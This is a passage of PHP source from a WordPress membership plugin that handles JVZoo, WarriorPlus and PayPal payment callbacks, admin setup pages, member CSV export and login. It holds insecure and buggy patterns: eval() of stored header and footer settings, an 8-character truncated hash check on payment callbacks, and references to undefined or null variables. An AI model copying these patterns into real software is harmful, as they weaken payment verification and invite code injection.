		global $membergenius;
		$unescape = get_magic_quotes_gpc();
		$fields = array('ccustname', 'ccustemail', 'ccustcc', 'ccuststate', 'ctransreceipt', 'cproditem', 'ctransaction', 'ctransaffiliate', 'ctranspublisher', 'cprodtype', 'cprodtitle', 'ctranspaymentmethod', 'ctransamount', 'caffitid', 'cvendthru', 'cverify');
		if ($membergenius->model->setting("notify")==1) { $this->notify(); }
		$vars = array();
		foreach ($fields as $field) {
			if (isset($post[$field])) { $vars[$field] = $post[$field]; }
		}
		$pop = "";
		$ipnFields = array();
		foreach ($vars AS $key => $value) {
			if ($key == "cverify") { continue; }
			$ipnFields[] = $key;
		}
		foreach ($ipnFields as $field) {
			if ($unescape) {
				$pop .= stripslashes($post_vars[$field]) . "|";
			} else { $pop .= $vars[$field] . "|"; }
		}
		$pop = $pop . $secretKey;
		$calcedVerify = sha1(mb_convert_encoding($pop, "UTF-8"));
		$calcedVerify = strtoupper(substr($calcedVerify,0,8));
		if ($calcedVerify == $vars["cverify"]) { return $vars; }
		return array();
	}

	public function notify() {
		$subject = "[IPN] JVZoo Notification Log";
		$price = "";
		if (isset($_POST["ctransamount"])) {
			$price = floatval($_POST["ctransamount"]);
		}
		if ($price == "") {
			$thePrice = "";
		} else { $thePrice = "" . number_format($price, 2); }

		if ($_POST["ctransaction"] == "RFND" || $_POST["ctransaction"] == "CGBK" || $_POST["ctransaction"] == "INSF") {
			$subject .= " (REFUND".$thePrice.")";
		} elseif ($_POST["ctransaction"] == "SALE") {
			$subject .= " (SALE".$thePrice.")";
		} elseif ($_POST["ctransaction"] == "BILL") {
			$subject .= " (REBILL".$thePrice.")";
		} elseif ($_POST["ctransaction"] == "CANCEL-REBILL") {
			$subject .= " (CANCELLATION".$thePrice.")";
		}
		$paymentDate = 0;
		if (isset($_POST["ctranstime"])) {
			$paymentDate = intval($_POST["ctranstime"]);
		} else {
			$paymentDate = time();
		}
		$message = "A new sale/refund was processed for customer ".htmlentities($_POST["ccustemail"]);
		if ($paymentDate) {
			$message .= " on ".date("m/d/".chr(89), $paymentDate)." at ".date("g:i A e", $paymentDate);
		}
		$message .= "Details: ";
		foreach ($_POST as $key => $value) { $message .= $key.': '.$value." "; }
		$this->email($subject, $message);
	}
}

class MemberGeniusCartWarrior extends MemberGeniusCart {
	function instructions() {
		global $membergenius;
		$levels = $membergenius->model->getLevels();
		$secret = $membergenius->model->setting("warriorplus_secret");
		$checkout = $membergenius->model->signupURL($secret);
		if (isset($_POST["warriorplus_token"])) {
			$membergenius->model->setting("warriorplus_token", trim(stripslashes($_POST["warriorplus_token"])));
		}

		if (isset($_POST["membergenius_warriorplus_item"]) && is_array($_POST["membergenius_warriorplus_item"])) {
			$items = array();
			foreach ($_POST["membergenius_warriorplus_item"] as $key => $value) {
				$items[$key] = $value;
			}
			$membergenius->model->setting("warriorplus_items", $items);
		}
		$items = $membergenius->model->setting("warriorplus_items");
		if (!is_array($items)) { $items = array(); }
		?>
		<h3>WarriorPlus Payment</h3>
		<h3>Step 1: Signup with Warrior Plus</h3>
		<p>Register an account at <a target="_blank" href="https://warriorplus.com">Warrior Plus</a>.
		<h3>Step 2: Create New Product</h3>
		<p>After registering and logging into <a target="_blank" href="https://warriorplus.com">Warrior Plus</a>, go to <code>Products</code>, <code>New Product.</code></p>
		<ul style="list-style:disc; padding-left:25px;">
			<li>Product Name: <code>Name of the Product</code></li>
			<li>Delivery URL: <code><?php echo home_url("/login"); ?></code></li>
		</ul>
		<p>Scroll down to <code>Advanced Integration.</code></p>
		<ul style="list-style:disc; padding-left:25px;">
			<li>Software: <code>Wishlist Member</code></li>
			<li>Wishlist URL: <code><?php echo home_url(); ?></code></li>
			<li>API Key: <code><?php echo $membergenius->model->setting("api_key"); ?></code></li>
			<li>Membership SKU: <i>(check table below)</i></li>
			<li>WL Post URL: <code><?php echo home_url(); ?></code></li>
			<li>Notification URL: <code><?php echo $checkout; ?></code></li>
			<li>Key Generation URL: <i>(leave blank)</i></li>
			<li>Send IPN To Delivery URL: <code>ON</code></li>
		</ul>
		<h3>Step 3: Set Security Key</h3>
		<p>In WarriorPlus, click on your username on the top right, and in the dropdown, choose <code>Account Settings</code>.</p>
		<p>Then click <code>Security Key</code> and if you don't have a security key set, click the link that says <code>Click here to create a Warrior+Plus Security key.</code></p>
		<p>Copy and paste your security key from WarriorPlus, enter it below, and click Save.</p>
		<p><input type="text" name="warriorplus_token" value="<?php echo htmlentities($membergenius->model->setting("warriorplus_token")); ?>" size="35" /><input type="submit" class="button" value="Save WarriorPlus Security Key" /></p>
		<h3>Step 4: Specify Membership SKU &amp; Post URL</h3>
		<p>In the table below, choose which membership level you're granting access to. Based on that, copy the <code>Membership SKU</code> and <code>WL Post URL</code> into WarriorPlus and click <code>Save</code>.
		<h3>Step 5: Copy Product Code from WarriorPlus</h3>
		<p>Finally, copy the Product Code (from the top of the WarriorPlus page, above &quot;Product Name&quot;) and paste it in the table below to match the corresponding level that your product relates to.<p>
		<p>Then click <code>Save WarriorPlus Product Codes.</code> This is necessary to handle refunds.</p>
		<blockquote>
			<p><table class="widefat" style="width:800px;">
					<thead>
						<tr>
							<th scope="col" style="width:250px;">Level to Provide Access To...</th>
							<th scope="col" style="width:150px; text-align:center;">Membership SKU</th>
							<th scope="col" style="width:300px;  text-align:center;">Product Code<br /><small>(from Warrior Plus, i.e. <code>wso_p1abc1</code>)</small></th>
						</tr>
					</thead>
					<?php foreach ($levels as $level): ?>
						<?php $item = "";
						if (isset($items[$level->ID])) {
							$item = $items[$level->ID];
						} else {
							$item = "";
						} ?>
						<tr>
							<td><?php echo htmlentities($level->level_name); ?></td>
							<td style="text-align:center;"><?php echo htmlentities($level->ID); ?></td>
							<td style="text-align:center;"><input type="text" size="10" name="membergenius_warriorplus_item[<?php echo htmlentities($level->ID); ?>]" value="<?php echo $item; ?>" /> </td>
					<?php endforeach; ?>
				</table>
			</p>
		</blockquote>
		<p><input type="submit" class="button" value="Save WarriorPlus Product Codes" /></p>
      <?php
	}

	function verify() {
		global $membergenius;
		$info = null;
		MemberGenius::clearCache();
		if (!isset($_POST["RECEIVERBUSINESS"])) { return; }
		$token = $membergenius->model->setting("warriorplus_token");
		if (!$token) { return; }
		if (!isset($_POST["WP_ACTION"]) || !isset($_POST["WP_SECURIT".chr(89)."KE".chr(89)]) || !isset($_POST["WP_ITEM_NUMBER"]) || !isset($_POST["WP_ITEM_NUMBER"]) || !isset($_POST["WP_SECURIT".chr(89)."KE".chr(89)])) { return; }
		if ($_POST["WP_SECURIT".chr(89)."KE".chr(89)] != $token) { return; }
		$item = $_POST["WP_ITEM_NUMBER"];
		$items = $membergenius->model->setting("warriorplus_items");
		$level = array_search($item, $items);
		if (!$level) { return; }
		$result = array( "firstname" => $_POST["FIRSTNAME"], "lastname" => $_POST["LASTNAME"], "email" => $_POST["EMAIL"], "username" => $_POST["EMAIL"], "level" => $level, "transaction" => $info["WP_TXNID"] );
		$action = $_POST["WP_ACTION"];
		if ($action == "refund") {
			$result["action"] = "cancel";
			return $result;
		}
		return null;
	}
}

class MemberGeniusCartPayPal extends MemberGeniusCart {
	function instructions() {
		global $membergenius;
		if (isset($_POST["paypal_token"])) {
			$membergenius->model->setting("paypal_token", trim($_POST["paypal_token"]));
		}

		$secret = $membergenius->model->setting("paypal_secret");
		$levels = $membergenius->model->getLevels();
		$firstLevel = reset($levels);
		$checkout = $membergenius->model->signupURL($secret);
		?>
		<h3>PayPal Payment</h3>
		<div style="width:800px;">
			<p>In order to accept payments using PayPal, you must:</p>
			<ul style="list-style:disc; padding-left:25px;">
				<li>enable &quot;IPN&quot; and &quot;PDT&quot; in your PayPal account</li>
				<li>enter your &quot;PDT token&quot; on this page</li>
				<li>create a payment button with the &quot;item ID&quot;, &quot;thank you URL&quot;, and &quot;advanced variables&quot; that we provide to you</li>
			</ul>
			<p>It is very important that you follow each step to ensure your payment button is working properly.<br />
			We also highly recommend that you run a test purchase (have a friend buy from you and go through the checkout process) to make sure everything is running smoothly.</p>
			<h3>Step 1: Configure PayPal Settings</h3>
			<blockquote>
				<p><i>(MiembroPress requires you to have a PayPal Business Account. If you only have a PayPal Personal Account then you will need to click <a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=_registration-run">upgrade your account</a> and choose Business account.)</i></p>
				<ol style="list-style-type:upper-alpha;">
					<li><input type="checkbox" /> <b>Enable Payment Data Transfer:</b> Login to <a target="_blank" href="https://www.paypal.com">your PayPal Account</a> click on <code>Profile</code>, then <code>My Selling Tools</code>, the <code>Selling Online</code> section, and <code>Website Preferences.</code><br />
					If you don't have a <code>Profile</code> tab, click the &quot;head&quot; icon on the top right, <code>Profile and Settings</code> and then <code>Website Preferences.</code><br />
					Click &quot;Update&quot; on the right.</li>
					<li><input type="checkbox" /> Set <code>Auto-Return</code> to <code>On</code> and click <code>Save</code> before continuing.<br />
					If the Return URL is blank, set it to: <code><?php echo site_url(); ?></code> (this URL does not matter, it only needs to point to a FUNCTIONAL website)</li>
					<li><input type="checkbox" /> Set <code>Payment Data Transfer</code> to <code>On</code> and click <code>Save</code> again. <i>Nothing else needs to be changed on this page.</i></li>
					<li><input type="checkbox" /> <b>Next, Enable Instant Payment Notifications:</b> In PayPal, go to <code>Profile</code>, then <code>My Selling Tools</code>, and <code>Instant Payment Notifications</code>.</li>
					<li><input type="checkbox" /> If IPN is turned off, click the yellow button that says <code>Turn IPN On</code>.<br />
					Click <code>Edit Settings</code>, and if the <code>Notification URL</code> is blank, enter <code><?php echo site_url(); ?></code><br />
					(Once again, this URL is not important, it only needs to be an address to a functioning website.)</li>
					<li><input type="checkbox" /> Confirm that the option for <code>Receive IPN messages (Enabled)</code> is checked and click the <code>Save</code> button to save your changes.</li>
				</ol>
			</blockquote>
			<h3>Step 2: Paste <?php echo chr(89); ?>our &quot;Identity Token&quot; from PayPal Below</h3>
			<blockquote>
				<ol style="list-style-type:upper-alpha;">
					<li><input type="checkbox" /> In your PayPal account, go to: <code>Profile</code>, <code>My Selling Tools</code>, the <code>Selling Online</code> section, then <code>Website Preferences</code>.<br />
					If you don't have a <code>Profile</code> tab, click the &quot;head&quot; icon on the top right, <code>Profile and Settings</code> and then <code>Website Preferences.</code><br />
					Click &quot;Update&quot; on the right.</li>
					<li><input type="checkbox" /> Under the Payment Data Transfer section, it should have the text <code>Identity Token:</code> followed by a series of letters and numbers. Copy that special code EXACTL<?php echo chr(89); ?> by highlighting it with your mouse. Be sure not to select the exact text says &quot;Identity Token:&quot; but everything directly after it.</li>
					<li><input type="checkbox" /> Then right click the text box below, and choose &quot;Paste&quot; to place your PDT Identity Token.</li>
				</ol>
				<label><b>PDT Identity Token:</b>
				<?php if ($membergenius->model->setting("paypal_token")): ?>
				<a href="#" onclick="jQuery('.paypal_token').show(); jQuery(this).hide(); return false;">Click to Show</a>
				<?php endif; ?>
				<input type="text" name="paypal_token" class="paypal_token" <?php if ($membergenius->model->setting("paypal_token")): ?>style="display:none;"<?php endif; ?> value="<?php echo htmlentities($membergenius->model->setting("paypal_token")); ?>" size="80" />
				</label> <input <?php if ($membergenius->model->setting("paypal_token")): ?>style="display:none;"<?php endif; ?> type="submit" class="button-secondary" value="Save PDT Identity Token" />
			</blockquote>
			<h3>Step 3: Create a Button in PayPal (Buy Now or Subscription)</h3>
			<blockquote>
				<ol style="list-style-type:upper-alpha;">
					<li><input type="checkbox" /> Create a button that your customers can click on to pay you money and gain access to your site.<br />
					In <a target="_blank" href="https://www.paypal.com">PayPal</a>, Go to <code>Merchant Services</code>, then <code>Create Payment Buttons For <?php echo chr(89); ?>our Website</code> and then choose to create a <code>Buy Now</code> button (for single payments) or a <code>Subscription</code> button for recurring payments.<br />
					If you don't have a <code>Merchant Services</code> tab, click the <code>Tools</code> tab, <code>PayPal Buttons</code>, <code>Create a Button</code>, then <code>Create New Button.</code>
					</li>
					<li>Under <code>Choose a Button Type</code>, choose <code>Buy Now</code> for a single payment site or <code>Subscription</code> for a payment plan or continuity site.</li>
					<li><input type="checkbox" /> Under <code>Item Name</code>, type in the name of the product or membership customers are buying, such as: <code><?php echo get_option("name"); ?> Access</code></li>
					<li><input type="checkbox" /> Under <code>Item ID</code> (this is labeled <code>Subscription ID</code> when creating a recurring button), you will need to copy the NUMBER from this page matching the LEVEL you want to provide access to. For example, if you want to grant access to the <code><?php echo htmlentities($firstLevel->level_name); ?></code> level, you would enter <code><?php echo intval($firstLevel->ID); ?></code> as your button's Item ID.</code></li>
					<p><table class="widefat" style="width:400px;">
						<thead>
							<tr>
								<th scope="col">Level Name</th>
								<th scope="col" style="text-align:center;">Item ID / Subscription ID</th>
							</tr>
						</thead>

						<?php foreach ($levels as $level): ?>
						<tr>
							<td><?php echo htmlentities($level->level_name); ?></td>
							<td style="text-align:center;"><?php echo intval($level->ID); ?></td>
						<?php endforeach; ?>
						</table>
					</p>
					<li><input type="checkbox" /> If you are creating a Buy Now button, enter the amount you want to charge for access in the <code>Price</code> section, such as <code>10.00</code>.</li>
					<li><input type="checkbox" /> If you are creating a Subscription button, you can set your price where under <code>Billing Amount Each Cycle</code>, this is the amount to charge with each billing such as <code>10.00</code>. Under <code>Billing Cycle</code>, choose how often you want to rebill your customers, such as every &quot;30 days&quot; or every &quot;1 month&quot;. Finally, under <code>After How Many Cycles Should Billing Stop?</code> choose <code>Never</code> to continue payments forever or choose a number, for example &quot;5&quot; to bill 5 times and then stop.</li>
					<li><input type="checkbox" /> We highly recommend that in the <code>Step 2: Track Inventory (optional)</code> section, you leave <code>Save Button at PayPal</code> checked.</li>
				</ol>
			</blockquote>
			<h3>Step 4: Set the &quot;Thank <?php echo chr(89); ?>ou URL&quot; of <?php echo chr(89); ?>our Button</h3>
			<blockquote>
				<ol style="list-style-type:upper-alpha;">
					<li><input type="checkbox" /> Click on <code>Step 3: Customize Advanced Features (optional)</code> on PayPal screen to keep going.</li>
					<li><input type="checkbox" /> <b>Finish Checkout:</b> Also check the box labeled <code>Take Customers To This URL When They Finish Checkout</code></li>
					<li><input type="checkbox" /> Copy that URL to your PayPal button creation screen by highlighting it (click and hold down), be sure not to highlight any spaces or blank areas, right click and Copy, then switch back to PayPal and Paste.</li>
					<p align="center">
					<textarea name="membergenius_checkout" id="membergenius_checkout" cols="60" rows="2" class="code" style="font-size:18px; font-weight:bold;"><?php echo htmlentities($checkout); ?></textarea><br />
					<input style="text-align:center;" type="submit" class="button-secondary" onclick="document.getElementById('membergenius_checkout').select(); return false;" value="Select All" />
					</p>
				</ol>
			</blockquote>
			<h3>Step 5: Paste the Code Below in the &quot;Add Advanced Variables&quot; Field</h3>
			<blockquote>
				<p><?php echo chr(89); ?>ou're almost finished creating your payment button.</p>
				<p><input type="checkbox" /> At the very botton of the page, check the <code>Add Advanced Variables</code> checkbox, and in the box below it, paste in this final bit of code:</p>
			</blockquote>
			<p align="center" style="text-align:center;">
				<textarea name="membergenius_variables" id="membergenius_variables"  cols="70" rows="3" class="code" style="font-size:18px; font-weight:bold;">rm=2<?php echo chr(10); ?>notify_url=<?php echo $checkout; ?><?php echo chr(10); ?>return=<?php echo $checkout; ?></textarea><br />
				<input style="text-align:center;" type="submit" class="button-secondary" onclick="document.getElementById('membergenius_variables').select(); return false;1" value="Select All" />
			</p>
			<blockquote>
				<p>Please make sure that you select, copy and paste all three lines above, into your PayPal button, with no extra spaces anywhere.</p>
			</blockquote>
			<h3>Step 6: Copy the Button Code from PayPal and Paste Into <?php echo chr(89); ?>our Sales Letter</h3>
			<blockquote>
				<p><input type="checkbox" /> Click <code>Create Button</code> and you should be taken to a new screen where you are presented with special code to place on your website to accept payments.</p>
				<p>We highly suggest you click the <code>Email</code> tab to grab a simple link that you can place on your web pages. We use <a target="_blank" href="http://www.papertemplate.com">Paper Template</a> to present sales letters to customers.</p>
			</blockquote>
			<p><input type="submit" class="button-primary" value="Save Settings" /></p>
		</div>
		<?php
	}

	function verify() {
		global $membergenius;
		$info = null;
		MemberGenius::clearCache();
		if (isset($_GET["tx"])) {
			$info = $this->verifyPDT($_GET["tx"], $membergenius->model->setting("paypal_token"));
		} elseif (isset($_POST["payer_email"])) {
			$info = $this->verifyIPN($_POST);
		}
		$transaction = null;
		if (isset($info["subscr_id"])) {
			$transaction = $info["subscr_id"];
		} elseif (isset($info["parent_txn_id"])) {
			$transaction = $info["parent_txn_id"];
		} elseif (isset($info["txn_id"])) {
			$transaction = $info["txn_id"];
		}
		$status = null;
		if (isset($info["payment_status"])) {
			$status = $info["payment_status"];
		} elseif (isset($info["txn_type"])) {
			$status = $info["txn_type"];
		}

		if (isset($info["first_name"]) && isset($info["last_name"]) && isset($info["payer_email"]) && isset($info["item_number"])) {
			$result = array( "firstname" => $info["first_name"], "lastname" => $info["last_name"], "email" => $info["payer_email"], "username" => $info["first_name"]." ".$info["last_name"], "level" => intval($info["item_number"]), "transaction" => $transaction, "action" => "register" );
		} else {
			$result = array();
		}

		if ($status == "Expired" || $status == "Failed" || $status == "Refunded" || $status == "Reversed" || $status == "subscr_failed" || $status == "recurring_payment_suspended_due_to_max_failed_payment" || $status == "subscr_cancel") {
			$result["action"] = "cancel";
		}
		return $result;
	}

	function verifyPDT($tx, $token) {
		$post = wp_remote_post("https://www.paypal.com/cgi-bin/webscr", array( "body" => array("cmd" => "_notify-synch", "tx" => $tx, "at" => $token), "httpversion" => 1.1 ) );
		$body = wp_remote_retrieve_body($post);
		$lines = explode(" ", $body);
		$result = array();
		if (trim($lines[0]) != "SUCCESS") { return null; }
		foreach ($lines as $line) {
			$key = null;
			$value = null;
			$fields = @explode("=", trim($line));
			if (count($fields) == 1) {
				list($key) = $fields;
			} else {
				list($key, $value) = $fields;
			}
			if ($value !== null) {
				$result[$key] = urldecode($value);
			}
		}
		return $result;
	}

	function verifyIPN($vars) {
		global $membergenius;
		$post = wp_remote_post("https://www.paypal.com/cgi-bin/webscr", array( "body" => array_merge(array("cmd" => "_notify-validate"), $vars), "httpversion" => 1.1 ) );
		$body = wp_remote_retrieve_body($post);
		if ($membergenius->model->setting("notify")==1) {
			$this->notify();
		}
		if (trim($body) != "VERIFIED") { return null; }
		return $vars;
	}

	public function notify() {
		if (!isset($_POST["payer_email"])) { return; }
		$subject = "[IPN] PayPal Notification Log";
		$price = "";
		if (isset($_POST["amount3"])) {
			$price = floatval($_POST["amount3"]);
		} elseif (isset($_POST["mc_amount3"])) {
			$price = floatval($_POST["mc_amount3"]);
		} elseif (isset($_POST["mc_gross"])) {
			$price = floatval($_POST["mc_gross"]);
		} elseif (isset($_POST["mc_gross1"])) {
			$price = floatval($_POST["mc_gross1"]);
		} elseif (isset($_POST["payment_gross"])) {
			$price = floatval($_POST["payment_gross"]);
		} if ($price == "") {
			$thePrice = "";
		} else {
			$thePrice = "" . number_format($price, 2);
		}

		if ($_POST["payment_status"] == "Refunded" || $_POST["payment_status"] == "Reversed") {
			$subject .= " (REFUND".$thePrice.")";
		} elseif ($_POST["txn_type"] == "web_accept" || $_POST["txn_type"] == "express_checkout") {
			$subject .= " (SALE".$thePrice.")";
		} elseif ($_POST["txn_type"] == "subscr_payment") {
			$subject .= " (REBILL".$thePrice.")";
		} elseif ($_POST["txn_type"] == "subscr_eot") {
			$subject .= " (ENDED".$thePrice.")";
		} elseif ($_POST["txn_type"] == "recurring_payment_outstanding_payment_failed" || $_POST["txn_type"] == "subscr_failed" || $_POST["txn_type"] == "recurring_payment_suspended_due_to_max_failed_payment" || $_POST["txn_type"] == "recurring_payment_skipped") {
			$subject .= " (REBILL FAILED".$thePrice.")";
		} elseif ($_POST["txn_type"] == "subscr_cancel" || $_POST["txn_type"] == "recurring_payment_profile_cancel") {
			$subject .= " (CANCELLATION".$thePrice.")";
		} elseif ($_POST["txn_type"] == "subscr_signup") {
			$subject .= " (SIGNUP".$thePrice.")";
		}
		$paymentDate = 0;
		if (isset($_POST["payment_date"])) {
			$paymentDate = strtotime($_POST["payment_date"]);
		} elseif (isset($_POST["subscr_date"])) {
			$paymentDate = strtotime($_POST["subscr_date"]);
		} else {
			$paymentDate = time();
		}
		$message = "A new sale/refund was processed for customer ".htmlentities($_POST["payer_email"]);
		$message .= " on ".date("m/d/".chr(89), $paymentDate)." at ".date("g:i A e", $paymentDate); $message .= " Details: ";
		foreach ($_POST as $key => $value) {
			$message .= $key.': '.$value." ";
		}
		$this->email($subject, $message);
	}
}

class MemberGeniusView {
	public function __construct() {
		add_action("wp_head", array(&$this, "head"));
		add_action("wp_footer", array(&$this, "foot"));
	}

	public function head() {
		global $membergenius;
		if ($header = $membergenius->model->setting("header")) {
			eval( '?> '.stripslashes(do_shortcode($header)).' <?php ' );
		}
	}

	public function foot() {
		global $membergenius;
		if ($footer = $membergenius->model->setting("footer")) {
			eval( ' ?> '.stripslashes(do_shortcode($footer)).' <?php ' );
		}
		$output = array();
		if ($attribution = $membergenius->model->setting("attribution")) {
			$link = "https://miembropress.com";
			if ($affiliate = $membergenius->model->setting("affiliate")) {
				$link = $affiliate;
			}
			$output[] = ' <a target="_blank" href="'.htmlentities($link).'"> Sitio de membresía de WordPress creado con MiembroPress </a> ';
		}

		if ($support = $membergenius->model->setting("support")) {
			$support = trim($support);
			if ($support) {
				$output[] = ' <a target="_blank" href="'.htmlentities($support).'"> Soporte </a> ';
			}
		}

		if (count($output) > 0) {
			echo ' <p align="center" style="clear:both;"> ';
			echo implode(" - ", $output);
			echo ' </p> ';
		}
	}

	public function download() {
		global $membergenius;
		if (!current_user_can("administrator")) { return; }
		MemberGenius::clearCache();
		@ob_end_clean();
		header("Content-type:text/plain");
		header('Content - Description: FileTransfer');
		header('Content - Type: application / octet - stream');
		header('Content - Disposition: attachment; filename = "export.csv"');
		header('Content - Transfer - Encoding: binary');
		header('Connection: Keep - Alive');
		header('Expires: 0');
		header('Cache - Control: must - revalidate, post - check = 0, pre - check = 0');
		header('Pragma: public ');
		$query = "";
		$status = null;
		if (isset($_POST["membergenius_level"]) && is_array($_POST["membergenius_level"])) {
			$query .= "&levels=".implode(",", $_POST["membergenius_level"]);
		}
		if (isset($_POST["membergenius_status"])) {
			if ($_POST["membergenius_status"] == "active") {
				$query .= "&status=A";
			} elseif ($_POST["membergenius_status"] == "canceled") {
				$query .= "&status=C";
			} elseif ($_POST["membergenius_status"] == "all") {
				$query .= "&status=A,C";
			}
		}
		$members = $membergenius->model->getMembers($query);
		echo "username,firstname,lastname,email,level,date";
		foreach ($members as $memberKey => $member) {
			$username = $member->user_login;
			$firstname = get_user_meta($member->ID,'first_name', true);
			$lastname = get_user_meta($member->ID,'last_name', true);
			$email = $member->user_email;
			$levels = array();
			foreach ($membergenius->model->getLevelInfo($member->ID) as $userLevel) {
				$levels[] = $userLevel->level_name;
			}
			$level = implode(",", $levels);
			$date = $member->user_registered;
			$line = array( "username" => $username, "firstname" => $firstname, "lastname" => $lastname, "email" => $email, "level" => $level, "date" => $date );
			$line = array_map(array(&$this, "download_sanitize"), $line);
			echo implode($line,",")." ";
		}
		die();
	}

	private function download_sanitize($input) {
		return '"'.addcslashes($input, "\"") . '"';
    }

	public function order($query) {
        if (isset($query->query_vars['post_type']) && $query->query_vars['post_type'] != 'post') {
            return;
        }
        add_filter('posts_orderby', array(&$this, 'orderBy'));
    }

	function orderBy($orderby) {
        global $membergenius;
        $order = $membergenius->model->setting("order");
        if ($order == "ascending") {
            $ord = "ASC";
        } else {
            $ord = "DESC";
        }
        global $wpdb;
        $orderby = $wpdb->posts . ".post_date " . $ord;
        return $orderby;
    }

	public function logout() {
        global $membergenius;
        if (isset($_GET["membergenius_action"]) && $_GET["membergenius_action"] == "switch_user") {
            wp_redirect(wp_login_url());
            die();
        } else {
            $logout_page = @intval($membergenius->model->setting("logout_page"));
            $logout_url = $membergenius->model->setting("logout_url");
            if ($logout_page == - 1) {
                $logout_link = wp_login_url();
            } elseif ($logout_page == 0) {
                $logout_link = $logout_url;
            } elseif ($logout_page) {
                $logout_link = get_permalink($logout_page);
            } else {
                $logout_link = null;
            }

			if (!$logout_link) {
                $logout_link = home_url();
            }
            wp_redirect($logout_link);
            die();
        }
    }


    public function enqueue_scripts() {
        wp_enqueue_script("jquery");
    }

	public function login() {
        if (is_user_logged_in()) { return; }
        if (!isset($_POST['wppp_username']) || !isset($_POST['wppp_password'])) { return; }
        $creds = array();
        $creds['user_login'] = $_POST['wppp_username'];
        $creds['user_password'] = $_POST['wppp_password'];
        $creds['remember'] = true;
        $user = wp_signon($creds, false);
        $userLevels = $membergenius->model->getLevelInfo($user->ID);
        if (!$userLevels || !is_array($userLevels)) {
            $userLevels = array();
        }
        if (!is_wp_error($user)) {
            wp_redirect(home_url());
        }
    }

	public function widget_control($args = null, $params = null) {
        return true;
    }

	public function widget($args) {
        extract($args);
        echo $before_widget;
        echo $before_title . 'Detalle de Membresía' . $after_title;

		?>
		<?php
		if (is_user_logged_in()): ?>
			&raquo; <a href="<?php echo wp_logout_url(); ?>" title="Logout">Salir</a>
		<?php
        else: ?>
			<?php wp_login_form(); ?>
		<?php
        endif; ?>
			<?php echo $after_widget;
    }

	public function autoresponder() {
        global $membergenius;
        if (is_admin()) { return; }
        if (!is_user_logged_in()) { return; }
        $current_user = wp_get_current_user();
        $userFirst = "";
        $userLast = "";
        $userEmail = "";
        if (isset($current_user->user_firstname)) {
            $userFirst = $current_user->user_firstname;
        }
        if (isset($current_user->user_lastname)) {
            $userLast = $current_user->user_lastname;
        }
        if (isset($current_user->user_email)) {
            $userEmail = $current_user->user_email;
        }
        $levels = $membergenius->model->getLevelInfo($current_user->ID, "U");
        if (!is_array($levels) || count($levels) == 0) { return; }
        $autoresponders = array();
        foreach ($levels as $level) {
            $membergenius->model->subscribe($current_user->ID, $level->level_id);
            $autoresponders[] = $membergenius->model->getAutoresponder($level->level_id);
        }
        $i = 0;
        foreach ($autoresponders as $key => $autoresponder): ?>
			<div id="membergenius_autoresponder[<?php echo $key; ?>]" style="display:none;">
			<?php echo $autoresponder["code"]; ?>
			</div>
			<iframe name="membergenius_submit[<?php echo $key; ?>]" width="1" height="1" src="about:blank" style="display:none;"></iframe>
			<?php $i++; ?>
			<?php endforeach; ?>

			<script type="text/javascript">
			<!--
			jQuery(function() {
			<?php foreach ($autoresponders as $key => $value): ?>
			var theAutoresponder = jQuery(document.getElementById("membergenius_autoresponder[<?php echo $key; ?>]"));
			var theForm = theAutoresponder.find("form").first();
			theForm.attr("target", "membergenius_submit[<?php echo $key; ?>]");

			<?php if (isset($value["email"])): ?>
				theAutoresponder.find("input[name='<?php echo htmlentities($value["email"]); ?>']").first().attr("value", "<?php echo htmlentities($userEmail); ?>");
			<?php endif; ?>

			<?php if (isset($value["firstname"])): ?>
				theAutoresponder.find("input[name='<?php echo htmlentities($value["firstname"]); ?>']").first().attr("value", "<?php echo htmlentities($userFirst); ?>");
			<?php endif; ?>

			<?php if (isset($value["lastname"])): ?>
				theAutoresponder.find("input[name='<?php echo htmlentities($value["lastname"]); ?>']").first().attr("value", "<?php echo htmlentities($userLast); ?>");
			<?php endif; ?>

			// Delete submit button which causes problems
			theForm.find("[name='submit']").each(function(i, obj) { jQuery(obj).remove(); });

			// Submit the form
			theForm.trigger("submit");

			<?php endforeach; ?>
			});
			  // -->
			  </script>
		<?php
	}
}

class MemberGeniusAdmin {
	public $activation;
	public $menu;
	function __construct() {
		$this->activation = new MemberGeniusActivation("http://2amactivation.com/incomemachine", "membergenius", "MiembroPress", "http://www.incomemachine.com/members");
		if (!function_exists('add_action')) { return; }
		add_action('admin_menu', array(&$this, 'menu_setup'));
		if ($this->activation->call == 0) {
			add_filter("plugin_action_links", array(&$this, 'links_unregistered'), 10, 2);
			return;
		}
		require_once( plugin_dir_path( __FILE__ ) . 'customizer/login-customizer.php');
		add_action( 'admin_bar_menu', array( $this, "admin_bar" ), 35 );
		if (!is_admin()) { return; }
		add_action('admin_init', array(&$this, 'admin_init'));
		add_action('profile_update', array(&$this, 'profile_update'));
		add_action('show_user_profile', array(&$this, 'profile'));
		add_action('edit_user_profile', array(&$this, 'profile'));
		add_filter('manage_pages_columns', array(&$this, 'columns'));
		add_action('manage_pages_custom_column', array(&$this, 'column'), 10, 2);
		add_filter('manage_posts_columns', array(&$this, 'columns'));
		add_action('manage_posts_custom_column', array(&$this, 'column'), 10, 2);
		add_action('wp_dashboard_setup', array($this, 'dashboard_setup'));
		add_filter("plugin_action_links", array(&$this, 'links'), 10, 2);
		add_action('add_meta_boxes', array(&$this, 'meta_boxes'));
		add_filter("wp_insert_post", array(&$this, 'meta_save'), 10, 2);
		add_filter("save_post", array(&$this, 'meta_save'));
	}

	public function cloak_placeholder($query) {
		if (!is_admin()) { return $query; }
		if ($placeholder = get_page_by_path("membergenius")) {
			if ($query != "") {
				$query .= " AND ";
			}
			$query .= "ID <> ".intval($placeholder->ID);
		}
		return $query;
	}

	public function tabLink($name="") {
		if ($name != "") {
			$suffix = "-".$name;
		} else { $suffix = ""; }
		return admin_url('admin.php?page='.plugin_basename('miembro-press/miembro-press.php').$suffix);
	}

	public function dashboard_setup() {
		if (!current_user_can('administrator')) { return; }
		wp_add_dashboard_widget('membergenius', 'MiembroPress Dashboard', array(&$this, 'menu_dashboard_panel'));
	}

	public function customizerLink() {
		$options = get_option( 'login_customizer_settings', array() );

		$url = add_query_arg(
			array(
				'autofocus[panel]' => 'logincust_panel',
				'url' => rawurlencode( get_permalink( $options['page'] ) ),
			),
			admin_url( 'customize.php' )
		);
		return $url;
	}

	public function admin_bar() {
		global $membergenius;
		$nonmember_page = @intval($membergenius->model->setting("nonmember_page"));
		$nonmember_url = $membergenius->model->setting("nonmember_url");
		if ($nonmember_page == 0) {
			$nonmember_link = $nonmember_url;
		} elseif ($nonmember_page) {
			$nonmember_link = get_permalink($nonmember_page);
